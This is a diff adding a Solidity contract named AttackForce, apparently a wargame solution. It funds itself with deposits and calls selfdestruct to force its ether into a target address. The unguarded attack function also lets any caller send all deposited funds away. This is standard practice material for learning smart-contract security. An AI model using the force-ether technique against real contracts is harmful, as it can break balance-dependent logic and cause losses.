@@ -1,0 +1,57 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "hardhat/console.sol";
+
+error HackForce_NotOwner();
+
+contract AttackForce {
+  // State variables
+  mapping(address => uint256) private s_fundersAmount;
+  address[] private s_funders;
+  address private immutable i_owner;
+
+  // Modifiers
+  modifier onlyOwner() {
+    require(msg.sender == i_owner);
+    if (msg.sender != i_owner) revert HackForce_NotOwner();
+    _;
+  }
+
+  constructor() {
+    i_owner = msg.sender;
+  }
+
+
+  function deposit() public payable {
+    s_fundersAmount[msg.sender] += msg.value;
+    s_funders.push(msg.sender);
+  }
+
+
+  function withdraw() public onlyOwner {
+
+    (bool callSuccess, ) = payable(msg.sender).call{ value: address(this).balance } ("");
+        require(callSuccess, "Call failed");
+  }
+
+  function getAddreesToAmount(address funder) public view returns (uint256) {
+      return s_fundersAmount[funder];
+  }
+
+  function getTotalFundersBalance() public view returns (uint256) {
+    uint256 total;
+    for (uint8 i = 0; i < s_funders.length; i++) {
+      address funder = s_funders[i];
+      total += s_fundersAmount[funder];
+      console.log("Funder %s: amount: %s", funder, s_fundersAmount[funder]);
+
+    }
+    return total;
+  }
+
+  function attack(address payable _to) public payable {
+    // address payable force = payable(address(force));
+    selfdestruct(_to);
+}
+}
